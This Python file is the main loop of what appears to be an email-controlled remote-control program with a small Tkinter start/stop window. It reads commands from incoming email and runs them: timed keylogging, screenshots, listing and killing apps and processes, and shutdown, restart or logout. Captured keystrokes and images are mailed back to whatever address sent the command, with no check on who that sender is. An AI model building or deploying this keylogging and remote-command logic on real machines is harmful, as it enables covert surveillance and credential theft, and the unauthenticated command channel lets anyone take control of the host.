import tkinter as tk
import threading
import time
import os
import EmailHandler as em
import KeyLogger as keyl
import ListApp as app
import ListProcess as proc
import ScreenShot
import Power

DEFAULT_KEYLOG_TIME = 300

def run_main_loop():
    global RunningMainLoop
    RunningMainLoop = True
    email = em.EmailHandler()
    waitCounter = 0
    idler = ['   ', '.  ', '.. ', '...']
    while RunningMainLoop:
    
        command = email.readLastestEmail()
        cmd = command[1].split()

        print(f'Waiting for next command{idler[waitCounter]}\r', end='')
        waitCounter = 0 if waitCounter == 3 else waitCounter + 1 
    
        result = ''
        image = None
        shutd = restart = logout = False

        if 'EMPTY' in cmd:
            continue
        os.system('cls')
        if cmd[0] == 'screenshot':
            result = 'Screenshot captured'
            image = ScreenShot.capture()

        elif cmd[0] == 'keylog':
            keylTime = DEFAULT_KEYLOG_TIME
            if '-t' in cmd:
                keylTime = int(cmd[cmd.index('-t') + 1])
            keylog = keyl.Keylogger(keylTime)
            print('Capturing...')
            keys = keylog.run()
            print('Finished')
            if '-both' in cmd:
                result += keys
                print(f'Log: {keylog.getLog()}')
                result += f'<br>Log: {keylog.getLog()}'
            elif '-l' in cmd:
                print(f'Log: {keylog.getLog()}')
                result += f'<br>Log: {keylog.getLog()}'
            else:
                result += keys

        elif cmd[0] == 'app':
            if cmd[1] == 'list':
                if '-all' in cmd:
                    appList = app.ListAllApp(cmd)
                else:
                    appList = app.ListApp(cmd)
                print('List sent')
                result += appList
            elif cmd[1] == '-end':
                app.StopApp(cmd[2])
                result = 'Stopped'
            else:
                app.OpenApp(cmd[2])
                result = 'Opened'

        elif cmd[0] == 'proc':
            if cmd[1] == 'list':
                procList = proc.ListGet()
                print(procList)
                result += procList

        elif cmd[0] == 'shutdown':
            shutd = True
            result = 'Shutdown'
        
        elif cmd[0] == 'restart':
            restart = True
            result = 'Restarted'
        
        elif cmd[0] == 'logout':
            logout = True
            result = 'Logged out'

        else:
            print('Error: Command not found')
            result = 'Error: Command not found'
        
        sender = command[2]
        if result != '':
            email.sendMail(sender, 'Your request has been executed', result, image)
        time.sleep(1)
        if shutd:
            Power.shutdown()
        elif restart:
            Power.restart()
        elif logout:
            Power.logout()

# Function to start the main loop in a separate thread
def start_main_loop():
    global main_loop_thread
    main_loop_thread = threading.Thread(target=run_main_loop)
    main_loop_thread.daemon = True  # Allows the thread to be terminated when the application is closed
    main_loop_thread.start()

# Function to stop the main loop
def stop_main_loop():
    global RunningMainLoop
    RunningMainLoop = False
    if main_loop_thread and main_loop_thread.is_alive():
        main_loop_thread.join()  # Stop the main loop thread
        os.system('cls')
        print("Main loop successfully stopped.")

# Create the main Tkinter window
root = tk.Tk()
root.title("Main Loop Control")
root.geometry("800x600")

# Create "Start" button
start_button = tk.Button(root, text="Start Main Loop", command=start_main_loop)
start_button.pack()

# Create "Stop" button
stop_button = tk.Button(root, text="Stop Main Loop", command=stop_main_loop)
stop_button.pack()

# Start the Tkinter main loop
root.mainloop()
